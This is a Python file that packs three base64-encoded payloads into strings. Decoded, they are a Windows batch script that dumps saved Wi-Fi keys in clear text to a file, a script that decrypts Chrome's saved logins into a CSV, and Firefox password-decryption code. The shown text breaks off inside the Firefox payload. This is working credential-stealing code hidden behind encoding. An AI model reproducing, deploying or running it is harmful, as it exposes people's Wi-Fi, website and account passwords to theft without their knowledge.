import base64
import subprocess
import os

wifi_password = """
QGVjaG8gb2ZmCmVjaG8gJWRhdGUlICV0aW1lJT4+c2VuaGFzLnR4dAplY2hvICV1c2VybmFtZSU+PnNlbmhhcy50eHQKZWNobyAtID4+c2VuaGFzLnR4dApuZXRzaCB3bGFuIHNob3cgcHJvZmlsZSBuYW1lPSoga2V5PWNsZWFyID4+c2VuaGFzLnR4dAplY2hvIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tID4+IHNlbmhhcy50eHQKcGF1c2U=
"""
chrome_password = """
aW1wb3J0IG9zCmltcG9ydCByZQppbXBvcnQgc3lzCmltcG9ydCBqc29uCmltcG9ydCBiYXNlNjQKaW1wb3J0IHNxbGl0ZTMKZnJvbSB3aW4zMiBpbXBvcnQgd2luMzJjcnlwdApmcm9tIENyeXB0b2RvbWUuQ2lwaGVyIGltcG9ydCBBRVMKaW1wb3J0IHNodXRpbAppbXBvcnQgY3N2CgojR0xPQkFMIENPTlNUQU5UCkNIUk9NRV9QQVRIX0xPQ0FMX1NUQVRFID0gb3MucGF0aC5ub3JtcGF0aChyIiVzXEFwcERhdGFcTG9jYWxcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcTG9jYWwgU3RhdGUiJShvcy5lbnZpcm9uWydVU0VSUFJPRklMRSddKSkKQ0hST01FX1BBVEggPSBvcy5wYXRoLm5vcm1wYXRoKHIiJXNcQXBwRGF0YVxMb2NhbFxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YSIlKG9zLmVudmlyb25bJ1VTRVJQUk9GSUxFJ10pKQoKZGVmIGdldF9zZWNyZXRfa2V5KCk6CiAgICB0cnk6CiAgICAgICAgIygxKSBHZXQgc2VjcmV0a2V5IGZyb20gY2hyb21lIGxvY2FsIHN0YXRlCiAgICAgICAgd2l0aCBvcGVuKCBDSFJPTUVfUEFUSF9MT0NBTF9TVEFURSwgInIiLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOgogICAgICAgICAgICBsb2NhbF9zdGF0ZSA9IGYucmVhZCgpCiAgICAgICAgICAgIGxvY2FsX3N0YXRlID0ganNvbi5sb2Fkcyhsb2NhbF9zdGF0ZSkKICAgICAgICBzZWNyZXRfa2V5ID0gYmFzZTY0LmI2NGRlY29kZShsb2NhbF9zdGF0ZVsib3NfY3J5cHQiXVsiZW5jcnlwdGVkX2tleSJdKQogICAgICAgICNSZW1vdmUgc3VmZml4IERQQVBJCiAgICAgICAgc2VjcmV0X2tleSA9IHNlY3JldF9rZXlbNTpdCiAgICAgICAgc2VjcmV0X2tleSA9IHdpbjMyY3J5cHQuQ3J5cHRVbnByb3RlY3REYXRhKHNlY3JldF9rZXksIE5vbmUsIE5vbmUsIE5vbmUsIDApWzFdCiAgICAgICAgcmV0dXJuIHNlY3JldF9rZXkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludCgiJXMiJXN0cihlKSkKICAgICAgICBwcmludCgiW0VSUl0gQ2hyb21lIHNlY3JldGtleSBjYW5ub3QgYmUgZm91bmQiKQogICAgICAgIHJldHVybiBOb25lCiAgICAKZGVmIGRlY3J5cHRfcGF5bG9hZChjaXBoZXIsIHBheWxvYWQpOgogICAgcmV0dXJuIGNpcGhlci5kZWNyeXB0KHBheWxvYWQpCgpkZWYgZ2VuZXJhdGVfY2lwaGVyKGFlc19rZXksIGl2KToKICAgIHJldHVybiBBRVMubmV3KGFlc19rZXksIEFFUy5NT0RFX0dDTSwgaXYpCgpkZWYgZGVjcnlwdF9wYXNzd29yZChjaXBoZXJ0ZXh0LCBzZWNyZXRfa2V5KToKICAgIHRyeToKICAgICAgICAjKDMtYSkgSW5pdGlhbGlzYXRpb24gdmVjdG9yIGZvciBBRVMgZGVjcnlwdGlvbgogICAgICAgIGluaXRpYWxpc2F0aW9uX3ZlY3RvciA9IGNpcGhlcnRleHRbMzoxNV0KICAgICAgICAjKDMtYikgR2V0IGVuY3J5cHRlZCBwYXNzd29yZCBieSByZW1vdmluZyBzdWZmaXggYnl0ZXMgKGxhc3QgMTYgYml0cykKICAgICAgICAjRW5jcnlwdGVkIHBhc3N3b3JkIGlzIDE5MiBiaXRzCiAgICAgICAgZW5jcnlwdGVkX3Bhc3N3b3JkID0gY2lwaGVydGV4dFsxNTotMTZdCiAgICAgICAgIyg0KSBCdWlsZCB0aGUgY2lwaGVyIHRvIGRlY3J5cHQgdGhlIGNpcGhlcnRleHQKICAgICAgICBjaXBoZXIgPSBnZW5lcmF0ZV9jaXBoZXIoc2VjcmV0X2tleSwgaW5pdGlhbGlzYXRpb25fdmVjdG9yKQogICAgICAgIGRlY3J5cHRlZF9wYXNzID0gZGVjcnlwdF9wYXlsb2FkKGNpcGhlciwgZW5jcnlwdGVkX3Bhc3N3b3JkKQogICAgICAgIGRlY3J5cHRlZF9wYXNzID0gZGVjcnlwdGVkX3Bhc3MuZGVjb2RlKCkgIAogICAgICAgIHJldHVybiBkZWNyeXB0ZWRfcGFzcwogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KCIlcyIlc3RyKGUpKQogICAgICAgIHByaW50KCJbRVJSXSBVbmFibGUgdG8gZGVjcnlwdCwgQ2hyb21lIHZlcnNpb24gPDgwIG5vdCBzdXBwb3J0ZWQuIFBsZWFzZSBjaGVjay4iKQogICAgICAgIHJldHVybiAiIgogICAgCmRlZiBnZXRfZGJfY29ubmVjdGlvbihjaHJvbWVfcGF0aF9sb2dpbl9kYik6CiAgICB0cnk6CiAgICAgICAgcHJpbnQoY2hyb21lX3BhdGhfbG9naW5fZGIpCiAgICAgICAgc2h1dGlsLmNvcHkyKGNocm9tZV9wYXRoX2xvZ2luX2RiLCAiTG9naW52YXVsdC5kYiIpIAogICAgICAgIHJldHVybiBzcWxpdGUzLmNvbm5lY3QoIkxvZ2ludmF1bHQuZGIiKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KCIlcyIlc3RyKGUpKQogICAgICAgIHByaW50KCJbRVJSXSBDaHJvbWUgZGF0YWJhc2UgY2Fubm90IGJlIGZvdW5kIikKICAgICAgICByZXR1cm4gTm9uZQogICAgICAgIAppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgdHJ5OgogICAgICAgICNDcmVhdGUgRGF0YWZyYW1lIHRvIHN0b3JlIHBhc3N3b3JkcwogICAgICAgIHdpdGggb3BlbignZGVjcnlwdGVkX3Bhc3N3b3JkLmNzdicsIG1vZGU9J3cnLCBuZXdsaW5lPScnLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBkZWNyeXB0X3Bhc3N3b3JkX2ZpbGU6CiAgICAgICAgICAgIGNzdl93cml0ZXIgPSBjc3Yud3JpdGVyKGRlY3J5cHRfcGFzc3dvcmRfZmlsZSwgZGVsaW1pdGVyPScsJykKICAgICAgICAgICAgY3N2X3dyaXRlci53cml0ZXJvdyhbImluZGV4IiwidXJsIiwidXNlcm5hbWUiLCJwYXNzd29yZCJdKQogICAgICAgICAgICAjKDEpIEdldCBzZWNyZXQga2V5CiAgICAgICAgICAgIHNlY3JldF9rZXkgPSBnZXRfc2VjcmV0X2tleSgpCiAgICAgICAgICAgICNTZWFyY2ggdXNlciBwcm9maWxlIG9yIGRlZmF1bHQgZm9sZGVyICh0aGlzIGlzIHdoZXJlIHRoZSBlbmNyeXB0ZWQgbG9naW4gcGFzc3dvcmQgaXMgc3RvcmVkKQogICAgICAgICAgICBmb2xkZXJzID0gW2VsZW1lbnQgZm9yIGVsZW1lbnQgaW4gb3MubGlzdGRpcihDSFJPTUVfUEFUSCkgaWYgcmUuc2VhcmNoKCJeUHJvZmlsZSp8XkRlZmF1bHQkIixlbGVtZW50KSE9Tm9uZV0KICAgICAgICAgICAgZm9yIGZvbGRlciBpbiBmb2xkZXJzOgogICAgICAgICAgICAJIygyKSBHZXQgY2lwaGVydGV4dCBmcm9tIHNxbGl0ZSBkYXRhYmFzZQogICAgICAgICAgICAgICAgY2hyb21lX3BhdGhfbG9naW5fZGIgPSBvcy5wYXRoLm5vcm1wYXRoKHIiJXNcJXNcTG9naW4gRGF0YSIlKENIUk9NRV9QQVRILGZvbGRlcikpCiAgICAgICAgICAgICAgICBjb25uID0gZ2V0X2RiX2Nvbm5lY3Rpb24oY2hyb21lX3BhdGhfbG9naW5fZGIpCiAgICAgICAgICAgICAgICBpZihzZWNyZXRfa2V5IGFuZCBjb25uKToKICAgICAgICAgICAgICAgICAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCiAgICAgICAgICAgICAgICAgICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBhY3Rpb25fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnMiKQogICAgICAgICAgICAgICAgICAgIGZvciBpbmRleCxsb2dpbiBpbiBlbnVtZXJhdGUoY3Vyc29yLmZldGNoYWxsKCkpOgogICAgICAgICAgICAgICAgICAgICAgICB1cmwgPSBsb2dpblswXQogICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGxvZ2luWzFdCiAgICAgICAgICAgICAgICAgICAgICAgIGNpcGhlcnRleHQgPSBsb2dpblsyXQogICAgICAgICAgICAgICAgICAgICAgICBpZih1cmwhPSIiIGFuZCB1c2VybmFtZSE9IiIgYW5kIGNpcGhlcnRleHQhPSIiKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMoMykgRmlsdGVyIHRoZSBpbml0aWFsaXNhdGlvbiB2ZWN0b3IgJiBlbmNyeXB0ZWQgcGFzc3dvcmQgZnJvbSBjaXBoZXJ0ZXh0IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyg0KSBVc2UgQUVTIGFsZ29yaXRobSB0byBkZWNyeXB0IHRoZSBwYXNzd29yZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVjcnlwdGVkX3Bhc3N3b3JkID0gZGVjcnlwdF9wYXNzd29yZChjaXBoZXJ0ZXh0LCBzZWNyZXRfa2V5KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlNlcXVlbmNlOiAlZCIlKGluZGV4KSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJVUkw6ICVzXG5Vc2VyIE5hbWU6ICVzXG5QYXNzd29yZDogJXNcbiIlKHVybCx1c2VybmFtZSxkZWNyeXB0ZWRfcGFzc3dvcmQpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIioiKjUwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyg1KSBTYXZlIGludG8gQ1NWIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3N2X3dyaXRlci53cml0ZXJvdyhbaW5kZXgsdXJsLHVzZXJuYW1lLGRlY3J5cHRlZF9wYXNzd29yZF0pCiAgICAgICAgICAgICAgICAgICAgI0Nsb3NlIGRhdGFiYXNlIGNvbm5lY3Rpb24KICAgICAgICAgICAgICAgICAgICBjdXJzb3IuY2xvc2UoKQogICAgICAgICAgICAgICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgICAgICAgICAgICAgICNEZWxldGUgdGVtcCBsb2dpbiBkYgogICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZSgiTG9naW52YXVsdC5kYiIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoIltFUlJdICVzIiVzdHIoZSkp
"""
firefox_password = """
ZnJvbSBfX2Z1dHVyZV9fIGltcG9ydCBhbm5vdGF0aW9ucwoKaW1wb3J0IGFyZ3BhcnNlCmltcG9ydCBjc3YKaW1wb3J0IGN0eXBlcyBhcyBjdAppbXBvcnQganNvbgppbXBvcnQgbG9nZ2luZwppbXBvcnQgbG9jYWxlCmltcG9ydCBvcwppbXBvcnQgcGxhdGZvcm0KaW1wb3J0IHNxbGl0ZTMKaW1wb3J0IHN5cwppbXBvcnQgc2h1dGlsCmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUKZnJvbSBnZXRwYXNzIGltcG9ydCBnZXRwYXNzCmZyb20gaXRlcnRvb2xzIGltcG9ydCBjaGFpbgpmcm9tIHN1YnByb2Nlc3MgaW1wb3J0IHJ1biwgUElQRSwgREVWTlVMTApmcm9tIHVybGxpYi5wYXJzZSBpbXBvcnQgdXJscGFyc2UKZnJvbSBjb25maWdwYXJzZXIgaW1wb3J0IENvbmZpZ1BhcnNlcgpmcm9tIHR5cGluZyBpbXBvcnQgT3B0aW9uYWwsIEl0ZXJhdG9yLCBBbnkKCkxPRzogbG9nZ2luZy5Mb2dnZXIKVkVSQk9TRSA9IEZhbHNlClNZU1RFTSA9IHBsYXRmb3JtLnN5c3RlbSgpClNZUzY0ID0gc3lzLm1heHNpemUgPiAyKiozMgpERUZBVUxUX0VOQ09ESU5HID0gInV0Zi04IgoKUFdTdG9yZSA9IGxpc3RbZGljdFtzdHIsIHN0cl1dCgoKZGVmIGdldF92ZXJzaW9uKCkgLT4gc3RyOgogICAgIiIiT2J0YWluIHZlcnNpb24gaW5mb3JtYXRpb24gZnJvbSBnaXQgaWYgYXZhaWxhYmxlIG90aGVyd2lzZSB1c2UKICAgIHRoZSBpbnRlcm5hbCB2ZXJzaW9uIG51bWJlcgogICAgIiIiCgogICAgZGVmIGludGVybmFsX3ZlcnNpb24oKToKICAgICAgICByZXR1cm4gIi4iLmpvaW4obWFwKHN0ciwgX192ZXJzaW9uX2luZm9fX1s6M10pKSArICIiLmpvaW4oX192ZXJzaW9uX2luZm9fX1szOl0pCgogICAgdHJ5OgogICAgICAgIHAgPSBydW4oWyJnaXQiLCAiZGVzY3JpYmUiLCAiLS10YWdzIl0sIHN0ZG91dD1QSVBFLCBzdGRlcnI9REVWTlVMTCwgdGV4dD1UcnVlKQogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgIHJldHVybiBpbnRlcm5hbF92ZXJzaW9uKCkKCiAgICBpZiBwLnJldHVybmNvZGU6CiAgICAgICAgcmV0dXJuIGludGVybmFsX3ZlcnNpb24oKQogICAgZWxzZToKICAgICAgICByZXR1cm4gcC5zdGRvdXQuc3RyaXAoKQoKCl9fdmVyc2lvbl9pbmZvX18gPSAoMSwgMSwgMCwgIitnaXQiKQpfX3ZlcnNpb25fXzogc3RyID0gZ2V0X3ZlcnNpb24oKQoKCmNsYXNzIE5vdEZvdW5kRXJyb3IoRXhjZXB0aW9uKToKICAgICIiIkV4Y2VwdGlvbiB0byBoYW5kbGUgc2l0dWF0aW9ucyB3aGVyZSBhIGNyZWRlbnRpYWxzIGZpbGUgaXMgbm90IGZvdW5kIiIiCgogICAgcGFzcwoKCmNsYXNzIEV4aXQoRXhjZXB0aW9uKToKICAgICIiIkV4Y2VwdGlvbiB0byBhbGxvdyBhIGNsZWFuIGV4aXQgZnJvbSBhbnkgcG9pbnQgaW4gZXhlY3V0aW9uIiIiCgogICAgQ0xFQU4gPSAwCiAgICBFUlJPUiA9IDEKICAgIE1JU1NJTkdfUFJPRklMRUlOSSA9IDIKICAgIE1JU1NJTkdfU0VDUkVUUyA9IDMKICAgIEJBRF9QUk9GSUxFSU5JID0gNAogICAgTE9DQVRJT05fTk9fRElSRUNUT1JZID0gNQogICAgQkFEX1NFQ1JFVFMgPSA2CiAgICBCQURfTE9DQUxFID0gNwoKICAgIEZBSUxfTE9DQVRFX05TUyA9IDEwCiAgICBGQUlMX0xPQURfTlNTID0gMTEKICAgIEZBSUxfSU5JVF9OU1MgPSAxMgogICAgRkFJTF9OU1NfS0VZU0xPVCA9IDEzCiAgICBGQUlMX1NIVVRET1dOX05TUyA9IDE0CiAgICBCQURfUFJJTUFSWV9QQVNTV09SRCA9IDE1CiAgICBORUVEX1BSSU1BUllfUEFTU1dPUkQgPSAxNgogICAgREVDUllQVElPTl9GQUlMRUQgPSAxNwoKICAgIFBBU1NTVE9SRV9OT1RfSU5JVCA9IDIwCiAgICBQQVNTU1RPUkVfTUlTU0lORyA9IDIxCiAgICBQQVNTU1RPUkVfRVJST1IgPSAyMgoKICAgIFJFQURfR09UX0VPRiA9IDMwCiAgICBNSVNTSU5HX0NIT0lDRSA9IDMxCiAgICBOT19TVUNIX1BST0ZJTEUgPSAzMgoKICAgIFVOS05PV05fRVJST1IgPSAxMDAKICAgIEtFWUJPQVJEX0lOVEVSUlVQVCA9IDEwMgoKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBleGl0Y29kZSk6CiAgICAgICAgc2VsZi5leGl0Y29kZSA9IGV4aXRjb2RlCgogICAgZGVmIF9fdW5pY29kZV9fKHNlbGYpOgogICAgICAgIHJldHVybiBmIlByZW1hdHVyZSBwcm9ncmFtIGV4aXQgd2l0aCBleGl0IGNvZGUge3NlbGYuZXhpdGNvZGV9IgoKCmNsYXNzIENyZWRlbnRpYWxzOgogICAgIiIiQmFzZSBjcmVkZW50aWFscyBiYWNrZW5kIG1hbmFnZXIiIiIKCiAgICBkZWYgX19pbml0X18oc2VsZiwgZGIpOgogICAgICAgIHNlbGYuZGIgPSBkYgoKICAgICAgICBMT0cuZGVidWcoIkRhdGFiYXNlIGxvY2F0aW9uOiAlcyIsIHNlbGYuZGIpCiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKGRiKToKICAgICAgICAgICAgcmFpc2UgTm90Rm91bmRFcnJvcihmIkVSUk9SIC0ge2RifSBkYXRhYmFzZSBub3QgZm91bmRcbiIpCgogICAgICAgIExPRy5pbmZvKCJVc2luZyAlcyBmb3IgY3JlZGVudGlhbHMuIiwgZGIpCgogICAgZGVmIF9faXRlcl9fKHNlbGYpIC0+IEl0ZXJhdG9yW3R1cGxlW3N0ciwgc3RyLCBzdHIsIGludF1dOgogICAgICAgIHBhc3MKCiAgICBkZWYgZG9uZShzZWxmKToKICAgICAgICAiIiJPdmVycmlkZSB0aGlzIG1ldGhvZCBpZiB0aGUgY3JlZGVudGlhbHMgc3ViY2xhc3MgbmVlZHMgdG8gZG8gYW55CiAgICAgICAgYWN0aW9uIGFmdGVyIGludGVyYWN0aW9uCiAgICAgICAgIiIiCiAgICAgICAgcGFzcwoKCmNsYXNzIFNxbGl0ZUNyZWRlbnRpYWxzKENyZWRlbnRpYWxzKToKICAgICIiIlNRTGl0ZSBjcmVkZW50aWFscyBiYWNrZW5kIG1hbmFnZXIiIiIKCiAgICBkZWYgX19pbml0X18oc2VsZiwgcHJvZmlsZSk6CiAgICAgICAgZGIgPSBvcy5wYXRoLmpvaW4ocHJvZmlsZSwgInNpZ25vbnMuc3FsaXRlIikKCiAgICAgICAgc3VwZXIoU3FsaXRlQ3JlZGVudGlhbHMsIHNlbGYpLl9faW5pdF9fKGRiKQoKICAgICAgICBzZWxmLmNvbm4gPSBzcWxpdGUzLmNvbm5lY3QoZGIpCiAgICAgICAgc2VsZi5jID0gc2VsZi5jb25uLmN1cnNvcigpCgogICAgZGVmIF9faXRlcl9fKHNlbGYpIC0+IEl0ZXJhdG9yW3R1cGxlW3N0ciwgc3RyLCBzdHIsIGludF1dOgogICAgICAgIExPRy5kZWJ1ZygiUmVhZGluZyBwYXNzd29yZCBkYXRhYmFzZSBpbiBTUUxpdGUgZm9ybWF0IikKICAgICAgICBzZWxmLmMuZXhlY3V0ZSgKICAgICAgICAgICAgIlNFTEVDVCBob3N0bmFtZSwgZW5jcnlwdGVkVXNlcm5hbWUsIGVuY3J5cHRlZFBhc3N3b3JkLCBlbmNUeXBlICIKICAgICAgICAgICAgIkZST00gbW96X2xvZ2lucyIKICAgICAgICApCiAgICAgICAgZm9yIGkgaW4gc2VsZi5jOgogICAgICAgICAgICAjIHlpZWxkcyBob3N0bmFtZSwgZW5jcnlwdGVkVXNlcm5hbWUsIGVuY3J5cHRlZFBhc3N3b3JkLCBlbmNUeXBlCiAgICAgICAgICAgIHlpZWxkIGkKCiAgICBkZWYgZG9uZShzZWxmKToKICAgICAgICAiIiJDbG9zZSB0aGUgc3FsaXRlIGN1cnNvciBhbmQgZGF0YWJhc2UgY29ubmVjdGlvbiIiIgogICAgICAgIHN1cGVyKFNxbGl0ZUNyZWRlbnRpYWxzLCBzZWxmKS5kb25lKCkKCiAgICAgICAgc2VsZi5jLmNsb3NlKCkKICAgICAgICBzZWxmLmNvbm4uY2xvc2UoKQoKCmNsYXNzIEpzb25DcmVkZW50aWFscyhDcmVkZW50aWFscyk6CiAgICAiIiJKU09OIGNyZWRlbnRpYWxzIGJhY2tlbmQgbWFuYWdlciIiIgoKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBwcm9maWxlKToKICAgICAgICBkYiA9IG9zLnBhdGguam9pbihwcm9maWxlLCAibG9naW5zLmpzb24iKQoKICAgICAgICBzdXBlcihKc29uQ3JlZGVudGlhbHMsIHNlbGYpLl9faW5pdF9fKGRiKQoKICAgIGRlZiBfX2l0ZXJfXyhzZWxmKSAtPiBJdGVyYXRvclt0dXBsZVtzdHIsIHN0ciwgc3RyLCBpbnRdXToKICAgICAgICB3aXRoIG9wZW4oc2VsZi5kYikgYXMgZmg6CiAgICAgICAgICAgIExPRy5kZWJ1ZygiUmVhZGluZyBwYXNzd29yZCBkYXRhYmFzZSBpbiBKU09OIGZvcm1hdCIpCiAgICAgICAgICAgIGRhdGEgPSBqc29uLmxvYWQoZmgpCgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBsb2dpbnMgPSBkYXRhWyJsb2dpbnMiXQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgTE9HLmVycm9yKGYiVW5yZWNvZ25pemVkIGZvcm1hdCBpbiB7c2VsZi5kYn0iKQogICAgICAgICAgICAgICAgcmFpc2UgRXhpdChFeGl0LkJBRF9TRUNSRVRTKQoKICAgICAgICAgICAgZm9yIGkgaW4gbG9naW5zOgogICAgICAgICAgICAgICAgeWllbGQgKAogICAgICAgICAgICAgICAgICAgIGlbImhvc3RuYW1lIl0sCiAgICAgICAgICAgICAgICAgICAgaVsiZW5jcnlwdGVkVXNlcm5hbWUiXSwKICAgICAgICAgICAgICAgICAgICBpWyJlbmNyeXB0ZWRQYXNzd29yZCJdLAogICAgICAgICAgICAgICAgICAgIGlbImVuY1R5cGUiXSwKICAgICAgICAgICAgICAgICkKCgpkZWYgZmluZF9uc3MobG9jYXRpb25zLCBuc3NuYW1lKSAtPiBjdC5DRExMOgogICAgIiIiTG9jYXRlIG5zcyBpcyBvbmUgb2YgdGhlIG1hbnkgcG9zc2libGUgbG9jYXRpb25zIiIiCiAgICBmYWlsX2Vycm9yczogbGlzdFt0dXBsZVtzdHIsIHN0cl1dID0gW10KCiAgICBPUyA9ICgiV2luZG93cyIsICJEYXJ3aW4iKQoKICAgIGZvciBsb2MgaW4gbG9jYXRpb25zOgogICAgICAgIG5zc2xpYiA9IG9zLnBhdGguam9pbihsb2MsIG5zc25hbWUpCiAgICAgICAgTE9HLmRlYnVnKCJMb2FkaW5nIE5TUyBsaWJyYXJ5IGZyb20gJXMiLCBuc3NsaWIpCgogICAgICAgIGlmIFNZU1RFTSBpbiBPUzoKICAgICAgICAgICAgIyBPbiB3aW5kb3dzIGluIG9yZGVyIHRvIGZpbmQgRExMcyByZWZlcmVuY2VkIGJ5IG5zczMuZGxsCiAgICAgICAgICAgICMgd2UgbmVlZCB0byBoYXZlIHRob3NlIGxvY2F0aW9ucyBvbiBQQVRICiAgICAgICAgICAgIG9zLmVudmlyb25bIlBBVEgiXSA9ICI7Ii5qb2luKFtsb2MsIG9zLmVudmlyb25bIlBBVEgiXV0pCiAgICAgICAgICAgIExPRy5kZWJ1ZygiUEFUSCBpcyBub3cgJXMiLCBvcy5lbnZpcm9uWyJQQVRIIl0pCiAgICAgICAgICAgICMgSG93ZXZlciB0aGlzIGRvZXNuJ3Qgc2VlbSB0byB3b3JrIG9uIGFsbCBzZXR1cHMgYW5kIG5lZWRzIHRvIGJlCiAgICAgICAgICAgICMgc2V0IGJlZm9yZSBzdGFydGluZyBweXRob24gc28gYXMgYSB3b3JrYXJvdW5kIHdlIGNoZGlyIHRvCiAgICAgICAgICAgICMgRmlyZWZveCdzIG5zczMuZGxsL2xpYm5zczMuZHlsaWIgbG9jYXRpb24KICAgICAgICAgICAgaWYgbG9jOgogICAgICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguaXNkaXIobG9jKToKICAgICAgICAgICAgICAgICAgICAjIE5vIHBvaW50IGluIHRyeWluZyB0byBsb2FkIGZyb20gcGF0aHMgdGhhdCBkb24ndCBleGlzdAogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgICAgICAgICAgd29ya2RpciA9IG9zLmdldGN3ZCgpCiAgICAgICAgICAgICAgICBvcy5jaGRpcihsb2MpCgogICAgICAgIHRyeToKICAgICAgICAgICAgbnNzOiBjdC5DRExMID0gY3QuQ0RMTChuc3NsaWIpCiAgICAgICAgZXhjZXB0IE9TRXJyb3IgYXMgZToKICAgICAgICAgICAgZmFpbF9lcnJvcnMuYXBwZW5kKChuc3NsaWIsIHN0cihlKSkpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgTE9HLmRlYnVnKCJMb2FkZWQgTlNTIGxpYnJhcnkgZnJvbSAlcyIsIG5zc2xpYikKICAgICAgICAgICAgcmV0dXJuIG5zcwogICAgICAgIGZpbmFsbHk6CiAgICAgICAgICAgIGlmIFNZU1RFTSBpbiBPUyBhbmQgbG9jOgogICAgICAgICAgICAgICAgIyBSZXN0b3JlIHdvcmtkaXIgY2hhbmdlZCBhYm92ZQogICAgICAgICAgICAgICAgb3MuY2hkaXIod29ya2RpcikKCiAgICBlbHNlOgogICAgICAgIExPRy5lcnJvcigKICAgICAgICAgICAgIkNvdWxkbid0IGZpbmQgb3IgbG9hZCAnJXMnLiBUaGlzIGxpYnJhcnkgaXMgZXNzZW50aWFsICIKICAgICAgICAgICAgInRvIGludGVyYWN0IHdpdGggeW91ciBNb3ppbGxhIHByb2ZpbGUuIiwKICAgICAgICAgICAgbnNzbmFtZSwKICAgICAgICApCiAgICAgICAgTE9HLmVycm9yKAogICAgICAgICAgICAiSWYgeW91IGFyZSBzZWVpbmcgdGhpcyBlcnJvciBwbGVhc2UgcGVyZm9ybSBhIHN5c3RlbS13aWRlICIKICAgICAgICAgICAgInNlYXJjaCBmb3IgJyVzJyBhbmQgZmlsZSBhIGJ1ZyByZXBvcnQgaW5kaWNhdGluZyBhbnkgIgogICAgICAgICAgICAibG9jYXRpb24gZm91bmQuIFRoYW5rcyEiLAogICAgICAgICAgICBuc3NuYW1lLAogICAgICAgICkKICAgICAgICBMT0cuZXJyb3IoCiAgICAgICAgICAgICJBbHRlcm5hdGl2ZWx5IHlvdSBjYW4gdHJ5IGxhdW5jaGluZyBmaXJlZm94X2RlY3J5cHQgIgogICAgICAgICAgICAiZnJvbSB0aGUgbG9jYXRpb24gd2hlcmUgeW91IGZvdW5kICclcycuICIKICAgICAgICAgICAgIlRoYXQgaXMgJ2NkJyBvciAnY2hkaXInIHRvIHRoYXQgbG9jYXRpb24gYW5kIHJ1biAiCiAgICAgICAgICAgICJmaXJlZm94X2RlY3J5cHQgZnJvbSB0aGVyZS4iLAogICAgICAgICAgICBuc3NuYW1lLAogICAgICAgICkKCiAgICAgICAgTE9HLmVycm9yKAogICAgICAgICAgICAiUGxlYXNlIGFsc28gaW5jbHVkZSB0aGUgZm9sbG93aW5nIG9uIGFueSBidWcgcmVwb3J0LiAiCiAgICAgICAgICAgICJFcnJvcnMgc2VlbiB3aGlsZSBzZWFyY2hpbmcvbG9hZGluZyBOU1M6IgogICAgICAgICkKCiAgICAgICAgZm9yIHRhcmdldCwgZXJyb3IgaW4gZmFpbF9lcnJvcnM6CiAgICAgICAgICAgIExPRy5lcnJvcigiRXJyb3Igd2hlbiBsb2FkaW5nICVzIHdhcyAlcyIsIHRhcmdldCwgZXJyb3IpCgogICAgICAgIHJhaXNlIEV4aXQoRXhpdC5GQUlMX0xPQ0FURV9OU1MpCgoKZGVmIGxvYWRfbGlibnNzKCk6CiAgICAiIiJMb2FkIGxpYm5zcyBpbnRvIHB5dGhvbiB1c2luZyB0aGUgQ0RMTCBpbnRlcmZhY2UiIiIKICAgIGlmIFNZU1RFTSA9PSAiV2luZG93cyI6CiAgICAgICAgbnNzbmFtZSA9ICJuc3MzLmRsbCIKICAgICAgICBsb2NhdGlvbnM6IGxpc3Rbc3RyXSA9IFsKICAgICAgICAgICAgIiIsICAjIEN1cnJlbnQgZGlyZWN0b3J5IG9yIHN5c3RlbSBsaWIgZmluZGVyCiAgICAgICAgICAgIG9zLnBhdGguZXhwYW5kdXNlcigiflxcQXBwRGF0YVxcTG9jYWxcXE1vemlsbGEgRmlyZWZveCIpLAogICAgICAgICAgICBvcy5wYXRoLmV4cGFuZHVzZXIoIn5cXEFwcERhdGFcXExvY2FsXFxGaXJlZm94IERldmVsb3BlciBFZGl0aW9uIiksCiAgICAgICAgICAgIG9zLnBhdGguZXhwYW5kdXNlcigiflxcQXBwRGF0YVxcTG9jYWxcXE1vemlsbGEgVGh1bmRlcmJpcmQiKSwKICAgICAgICAgICAgb3MucGF0aC5leHBhbmR1c2VyKCJ+XFxBcHBEYXRhXFxMb2NhbFxcTmlnaHRseSIpLAogICAgICAgICAgICBvcy5wYXRoLmV4cGFuZHVzZXIoIn5cXEFwcERhdGFcXExvY2FsXFxTZWFNb25rZXkiKSwKICAgICAgICAgICAgb3MucGF0aC5leHBhbmR1c2VyKCJ+XFxBcHBEYXRhXFxMb2NhbFxcV2F0ZXJmb3giKSwKICAgICAgICAgICAgIkM6XF